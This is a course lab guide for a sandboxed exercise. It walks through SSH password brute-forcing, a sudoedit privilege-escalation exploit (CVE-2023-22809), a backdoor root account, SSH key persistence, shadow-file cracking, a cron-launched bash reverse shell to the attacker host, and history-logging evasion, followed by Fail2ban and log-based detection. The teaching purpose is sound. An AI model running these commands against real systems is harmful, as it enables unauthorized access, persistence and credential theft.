# PB177 – Persistence, privilege escalation, defense evasion, credential access

## Table of Contents
- [Learning objectives](#learning-objectives)
- [Start the sandbox](#start-the-sandbox)
- [Attack](#attack)
  - [Task: Brute Force: Password Guessing](#task-brute-force-password-guessing)
  - [Task: Exploitation for Privilege Escalation](#task-exploitation-for-privilege-escalation)
  - [Task: Create Account: Local Account](#task-create-account-local-account)
  - [Task: Account Manipulation: SSH Authorized Keys](#task-account-manipulation-ssh-authorized-keys)
  - [Task: OS Credential Dumping: /etc/passwd and /etc/shadow and Brute Force: Password Cracking](#task-os-credential-dumping-etcpasswd-and-etcshadow-and-brute-force-password-cracking)
  - [Task: Scheduled Task/Job: Cron](#task-scheduled-taskjob-cron)
  - [Task: Impair Defenses: Impair Command History Logging](#task-impair-defenses-impair-command-history-logging)
  - [Task: Indicator Removal: Clear Linux or Mac System Logs](#task-indicator-removal-clear-linux-or-mac-system-logs)
- [Detection and mitigation](#detection-and-mitigation)
  - [Fail2ban](#fail2ban)
  - [Searching in system logs](#searching-in-system-logs)
- [End of the lab](#end-of-the-lab)

## Learning objectives

At the end of this lab session, you will be able to:
- run brute-force attack on SSH password-based authentication,
- escalate privileges of a user at a target host using one particular vulnerability,
- change the target system to keep access to it after the password change,
- apply techniques of defense evasion,
- steal the superuser password from the target, 
- detect the particular exploit and mitigate the vulnerability and other malicious actions after the privilege escalation.

<details open>
<summary>What is persistence?</summary> 

Techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0003/) for more info.

</details>

<details open>
<summary>What is privilege escalation?</summary> 

Techniques that adversaries use to gain higher-level permissions on a system or network.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0004/) for more info.

</details>

<details open>
<summary>What is defense evasion?</summary> 

Techniques that adversaries use to avoid detection throughout their compromise.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0005/) for more info.

</details>

<details open>
<summary>What is credential access?</summary> 

Techniques for stealing credentials like account names and passwords.\
See [MITRE ATT&CK® Matrix for Enterprise](https://attack.mitre.org/tactics/TA0006/) for more info.

</details>

## Start the sandbox

1. Update the repo by running `git pull` in `labs` directory. Go to `3` directory.
1. Login to get access to Podman images: `podman login gitlab.fi.muni.cz:5050`.
1. **Run `podman-compose pull` to download images used in this lab.**
1. Run `podman-compose up -d`.
1. [Check you can access Kali container using terminal and RDP](../1/index.md#start-the-sandbox). This lab uses two containers, `podman-compose ps -q | wc -l` should display `2`.

## Attack

### Task: Brute Force: Password Guessing

[T1110.001](https://attack.mitre.org/techniques/T1110/001/)

Your target is a host with IP 10.0.33.110.\
Use `ncrack`, `medusa`, or `hydra` at `attacker` to guess password for authentication of user `test` via SSH.

Hints
  * Check the content of `/usr/share/seclists/` directory at `attacker`.
  * Use `probable-v2-top12000.txt` wordlist.
  * The password is a meaningful word consisting of 4 English small letters. Filter out all other passwords and use a shortened wordlist.
  * If the password is not guessed within a minute, terminate the tool and use another filter for shortening the wordlist.

<details open>

<summary>
Solution
</summary>

  * Filter out passwords: `grep -h -E '^[a-z]{4}$' /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt > wordlist.txt`
  * `ncrack -v --user test -P wordlist.txt 10.0.33.110:22`
  * `medusa -h 10.0.33.110 -u test -P wordlist.txt -M ssh`
  * `hydra -l test -P wordlist.txt ssh://10.0.33.110`
  * If you used only one of these three tools, try the others to see how their features, output, and speed differ. 

</details>

### Task: Exploitation for Privilege Escalation

[T1068](https://attack.mitre.org/techniques/T1068/)

Once you are logged in to the target via SSH, escalate privileges of the user `test`, i. e., get root access, which enables changing host configuration.

Start with exploring the system.

<details open>
<summary>Exploring</summary>

Read the [message of the day](https://en.wikipedia.org/wiki/Message_of_the_day) (MOTD) thoroughly.

What operating system and version is running at the target?

Is there any other information attracting your attention?

All this information can be gathered manually from configuration files and utilities, however we will try an automated tool, [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). Find a way to run it on the target machine. While the tools output is rather long, it is nicely structured so you can smoothly find what you are looking for.

<details open>
<summary>
Solution
</summary>

* Operating system: `Ubuntu 22.04.5 LTS`
* `This system has been minimized by removing packages and content that are not required on a system that users do not log into.` &ndash; typical for containers.
* `To change the DNS resolver, run 'sudoedit /etc/resolv.conf' and edit value of 'nameserver'` &ndash; non-privileged users are usually not permitted to edit system configuration files, such as `/etc/resolv.conf`. This user got an exemption and can edit the DNS resolver.

</details>
</details>
</br>

Next, we need to find a target to exploit. Focus on the _"Files with interesting permissions"_ chapter of the **LinPEAS** output.

<details open>
<summary>Finding a vulnerability</summary>

The output of LinPEAS clearly states that you should `check if the sudo version is vulnerable`. This is further empowered by the information in the MOTD. 

Search for known vulnerabilities of `sudo` matching the version used at the target. Use [NVD](https://nvd.nist.gov/vuln/search) and **advanced** search of vulnerability database. Use **CPE** search fields. CPE is [a structured naming scheme](https://csrc.nist.gov/projects/security-content-automation-protocol/specifications/cpe) for information technology systems, software, and packages.

Which known vulnerability might apply to our target? 

<details open>
<summary>
Solution
</summary>

* `sudo -V` tells version `1.9.9`
* [Search results for advanced search using CPE](https://nvd.nist.gov/vuln/search/results?form_type=Advanced&results_type=overview&search_type=all&isCpeNameSearch=false&cpe_vendor=cpe%3A%2F%3Asudo_project&cpe_product=cpe%3A%2F%3Asudo_project%3Asudo&cpe_version=cpe%3A%2F%3Asudo_project%3Asudo%3A1.9.9) yields 6 records.
* Description of [CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809) contains `sudoedit`, which is mentioned in the MOTD.

</details>
</details>
<br/>

Study the selected vulnerability and exploit it at the target to edit `/etc/passwd` file ([man pages](https://man7.org/linux/man-pages/man5/passwd.5.html)), which can be edited only by the superuser (root).

<details open>
<summary>
Solution
</summary>

* `sudoedit /etc/resolv.conf` is legitimate command for editing the particular file. This is set in `/etc/sudoers` config file (not readable by non-privileged user).
* The vulnerability can be exploited by setting `EDITOR` variable. The CVE description says "The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism".
* Exploit: `EDITOR='vim -- /etc/passwd' sudoedit /etc/resolv.conf`
* It runs `vim` with 2 files for editing. The first one is `/etc/passwd`. When you quit editing using `:q`. `vim` displays "1 more file to edit" and opens `/etc/passwd` again for editing. Quit `vim` again.
* To sum it up, using the exploit, you can edit **any existing file as `root`**, not only `/etc/resolv.conf` specified in `/etc/sudoers`. Note you can **not run** programs as `root`.

</details>

### Task: Create Account: Local Account

[T1136.001](https://attack.mitre.org/techniques/T1136/001/)

Run the exploit again and add a new superuser account `admin` to `/etc/passwd`.

Hint: use `openssl` or [online Crypt() Hashing Function](https://www.dcode.fr/crypt-hashing-function) to generate a hash of a new password.

<details open>
<summary>
Solution and follow-up task
</summary>

* Prepare a hash of a new password for the new account using `openssl passwd verysecurepassword`. Is it better to run the command at the target or `attacker`? Why?
* Run the exploit: `EDITOR='vim -- /etc/passwd' sudoedit /etc/resolv.conf`
* Edit `/etc/passwd` and add a new line for user `admin`: `admin:$1$oIPLZTIa$7JF0pA5ea47LlyVUyc.jT/:0:0:root:/root:/bin/bash`
* Save the edited file by `:x` and quit `vim`.
* Check the newly created account by `su admin` and typing the created password (`verysecurepassword`). You should get `root` shell: `root@server:/home/test#`

</details>

Try to connect to the target using a newly created account via SSH from `attacker`. Why does it fail?

<details open>
<summary>
Solution and follow-up tasks
</summary>

* Although the correct password is entered, there is another mechanism preventing remote access to privileged accounts, namely `admin` and `root` at the target.
* The SSH server is configured so.
* Change the configuration to permit root login. Do not forget to restart the SSH service to apply the change.
* Try to connect from `attacker` via SSH as `root` to check your configuration changes were successfully applied. Connecting as `admin` fails because the SSH server needs the password hash in `/etc/shadow`, not only in `/etc/passwd`. If you still cannot log in, edit `/etc/pam.d/sshd`, uncomment the following line: `# session    required     pam_loginuid.so`, and restart the SSH service.

* Another option is to leverage an existing legitimate account (`test`) for remote access and switch to a superuser account (`admin` or `root`). 
* However, if the user `test` changes their password, the remote access is lost.

</details>

### Task: Account Manipulation: SSH Authorized Keys

[T1098.004](https://attack.mitre.org/techniques/T1098/004/)

Strengthen your persistence at the target and add your SSH public key to `~/.ssh/authorized_keys` of user `test`.

<details open>
<summary>
Solution
</summary>

* Use `ssh-keygen` utility to generate a key pair.
* Add the **public** key to `/home/test/.ssh/authorized_keys` to the target. Create the file if necessary.
* Use the **private** key to authorize when connecting from `attacker`: `ssh -i <private_key> test@10.0.33.110`

</details>

### Task: OS Credential Dumping: /etc/passwd and /etc/shadow and Brute Force: Password Cracking

[T1003.008](https://attack.mitre.org/techniques/T1003/008/) and [T1110.002](https://attack.mitre.org/techniques/T1110/002/)

Get the hash of a `root` password and crack it to get another credential.\
It might be helpful once other credentials are changed, or when authenticating to other hosts or services where the same password is used.

> There are two famous tools for cracking passwords, however the hashing algorithm used is not supported by [`hashcat`](https://hashcat.net/hashcat/).

<details open>
<summary>
Solution
</summary>

* Use [John the Ripper](https://www.openwall.com/john/) password cracker.
* John needs only the hash part of the `/etc/shadow` entry. Copy it out or use the `unshadow` utility, which combines content of `/etc/passwd` and `/etc/shadow`: `unshadow passwd shadow > mypasswd`
* Run John: `john --format=crypt mypasswd`
* What host would you use to run John and why?

</details>

### Task: Scheduled Task/Job: Cron

[T1053.003](https://attack.mitre.org/techniques/T1053/003/)

Finally, set a scheduled task, which will start every minute a reverse shell using BASH to `attacker`.\
Check the shell by running any command from `attacker`.
You can use [these](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) materials to learn more about reverse shells.

<details open>
<summary>
Solution
</summary>

* Use Cron.
* Edit Cron config file by `crontab -e`.
* Add the following line: `* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.2/6666 0>&1'`
  * Five asterisks set that the subsequent command will be run every minute.
  * Reverse shell itself is `/bin/bash -i >& /dev/tcp/10.0.0.2/6666 0>&1`.
  * `/dev/tcp/10.0.0.2/6666` specifies IP address and port where both input and output will be forwarded. It is the IP of `attacker`.
  * Cron does not allow running interactive commands directly, so `/bin/bash -c` must be used to execute the reverse shell.
* Save the file. You should see `crontab: installing new crontab`.
* Start listening at `attacker` at the port used in the `bash` command above (6666): `nc -l -p 6666`.
* Wait for the shell being executed by `cron` at the target every minute. You will see a shell prompt: `root@server:~#`.
* Execute any command.

</details>

### Task: Impair Defenses: Impair Command History Logging

[T1562.003](https://attack.mitre.org/techniques/T1562/003/)

View command history files of all users you have been logged in (`test`, `admin`, `root`) at the target.\
Set the history control environment variable so that commands that start with a space will not be logged.\
Check the settings are applied correctly by typing `echo 1` and then ` echo 2`. What is this good for?

<details open>
<summary>
Solution
</summary>

* Run `history` to see the command history of the logged user.
* Run `HISTCONTROL=ignorespace` to set the history control environment variable.
* Run `echo 1`.
* View history using `history`. You should see `echo 1` in the second last line.
* Run ` echo 2` and view history again. You should **not** see ` echo 2`, only `history` twice.

</details>

### Task: Indicator Removal: Clear Linux or Mac System Logs

[T1070.002](https://attack.mitre.org/techniques/T1070/002/)

Locate system logs and search authentication logs for your successful and unsuccessful login attempts from the brute-force attack on password-based authentication and subsequent remote access using users `test`, `root`, and `admin`.

Can you find logs showing the execution of Cron tasks?

All these entries are crucial for intrusion detection and post-mortem investigation. Attackers may delete them to make it difficult for defenders.

Do not delete any log files or lines in the files. We will need them for further tasks.

<details open>
<summary>
Solution
</summary>

* Logs are located in `/var/log` directory, authentication logs in `/var/log/auth.log` and Cron logs in `/var/log/syslog`.
* Search for `Failed` and `Accepted` in `auth.log` to list SSH authentication events.
* Search for `CRON` in `syslog`.

</details>

## Detection and mitigation

Now work at `server` and detect the attack and secure the system.

### Fail2ban

Install and setup [Fail2Ban](https://github.com/fail2ban/fail2ban/wiki) to detect and prevent brute-force attacks at SSH.

<details open>
<summary>
Solution
</summary>

* Install Fail2Ban at `server` under `root`: `apt install fail2ban`.
* Set `logfile` for the `sshd` service to `/var/log/auth.log` in `/etc/fail2ban/jail.d/defaults-debian.conf `, i. e. add this line to the end of the file: `logfile = /var/log/auth.log`                      
* Start Fail2Ban: `service fail2ban start`. You should see `[OK]` at right.
* Check the status of the `sshd` jail: `fail2ban-client status sshd`.

</details>

Run the brute-force attack from `attacker` again and check the status of the `sshd` jail at `server`.\
List `iptables` rules at `server` and find a rule implementing the ban.

<details open>
<summary>
Solution
</summary>

* `fail2ban-client status sshd` shows `Actions` and `Banned IP list:`.
* `iptables -L` shows that the INPUT chain contains target `f2b-sshd` for SSH traffic.\
`f2b-sshd` chain contains a line with the REJECT target for the source adress of `attacker`.
* Search for the `Ban` event in the Fail2Ban logs in `/var/log/fail2ban.log`.
* Try to connect from attacker to server using SSH.
  * You will get `ssh: connect to host 10.0.33.110 port 22: Connection refused` if the ban is still active.
  * You can connect if the IP has been unbanned. Check `/var/log/fail2ban.log`.
  * Why do you think banning IPs only for a limited time is a good idea?

</details>

### Searching in system logs

Use `grep` to search for the execution of the `sudo` exploit.

<details open>
<summary>
Solution
</summary>
<br/>

`grep sudo /var/log/syslog`

</details>

## End of the lab

If you finish all tasks, stop the sandbox using `podman-compose down`.
